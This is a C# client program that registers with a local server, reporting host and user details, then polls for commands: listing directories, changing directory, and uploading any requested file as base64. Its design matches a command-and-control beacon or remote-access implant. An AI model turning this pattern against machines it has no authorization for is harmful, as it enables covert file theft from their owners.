using System.Net.Http.Json;
using System.Text.Json;
using System.Text.Json.Serialization;

// ── Configuration ──
const string ServerUrl = "http://localhost:5000";
const int PollIntervalMs = 3000;

var clientId = Guid.NewGuid().ToString()[..8];
var http = new HttpClient { BaseAddress = new Uri(ServerUrl), Timeout = TimeSpan.FromSeconds(10) };
var jsonOpts = new JsonSerializerOptions { PropertyNameCaseInsensitive = true };

// ── Register ──
while (true)
{
    try
    {
        await Register();
        break;
    }
    catch
    {
        await Task.Delay(5000);
    }
}

// ── Main loop ──
while (true)
{
    try
    {
        var task = await PollTask();
        if (task is not null)
        {
            var result = HandleTask(task);
            await SubmitResult(task.Id, result);
        }
    }
    catch { /* connection lost, just retry */ }

    await Task.Delay(PollIntervalMs);
}

// ── Server communication ──

async Task Register()
{
    var info = new
    {
        client_id = clientId,
        hostname = Environment.MachineName,
        username = Environment.UserName,
        os = "windows",
        cwd = Directory.GetCurrentDirectory()
    };
    await http.PostAsJsonAsync("/api/register", info);
}

async Task<TaskPayload?> PollTask()
{
    await Register();
    var resp = await http.GetFromJsonAsync<TaskResponse>($"/api/tasks/{clientId}", jsonOpts);
    return resp?.Task;
}

async Task SubmitResult(string taskId, object result)
{
    var payload = new { task_id = taskId, result };
    await http.PostAsJsonAsync($"/api/results/{clientId}", payload);
}

// ── Command handlers ──

object HandleTask(TaskPayload task)
{
    return task.Command switch
    {
        "ls" => DoLs(task.Args),
        "cd" => DoCd(task.Args),
        "pwd" => new { output = Directory.GetCurrentDirectory() },
        "download" => DoDownload(task.Args),
        "ping" => new { output = "pong" },
        _ => new { error = $"Unknown command: {task.Command}" }
    };
}

object DoLs(string path)
{
    try
    {
        var target = string.IsNullOrEmpty(path) ? "." : path;
        var fullPath = Path.GetFullPath(target);
        var entries = new List<object>();

        foreach (var dir in Directory.GetDirectories(fullPath))
        {
            entries.Add(new { name = Path.GetFileName(dir), is_dir = true, size = 0L });
        }
        foreach (var file in Directory.GetFiles(fullPath))
        {
            var fi = new FileInfo(file);
            entries.Add(new { name = fi.Name, is_dir = false, size = fi.Length });
        }

        return new { entries, path = fullPath };
    }
    catch (Exception ex)
    {
        return new { error = ex.Message };
    }
}

object DoCd(string path)
{
    if (string.IsNullOrEmpty(path))
        return new { error = "No path provided" };
    try
    {
        var full = Path.GetFullPath(path);
        if (!Directory.Exists(full))
            return new { error = $"Directory not found: {full}" };
        Directory.SetCurrentDirectory(full);
        return new { output = $"Changed to {Directory.GetCurrentDirectory()}" };
    }
    catch (Exception ex)
    {
        return new { error = ex.Message };
    }
}

object DoDownload(string path)
{
    if (string.IsNullOrEmpty(path))
        return new { error = "No path provided" };
    try
    {
        var full = Path.GetFullPath(path);
        var fi = new FileInfo(full);
        if (!fi.Exists)
            return new { error = $"File not found: {full}" };
        if (fi.Length > 50 * 1024 * 1024)
            return new { error = $"File too large: {fi.Length} bytes" };

        var bytes = File.ReadAllBytes(full);
        var b64 = Convert.ToBase64String(bytes);

        return new
        {
            filename = fi.Name,
            path = full,
            size = fi.Length,
            data_b64 = b64
        };
    }
    catch (Exception ex)
    {
        return new { error = ex.Message };
    }
}

// ── Models ──

record TaskResponse
{
    [JsonPropertyName("task")]
    public TaskPayload? Task { get; init; }
}

record TaskPayload
{
    [JsonPropertyName("id")]
    public string Id { get; init; } = "";

    [JsonPropertyName("command")]
    public string Command { get; init; } = "";

    [JsonPropertyName("args")]
    public string Args { get; init; } = "";
}
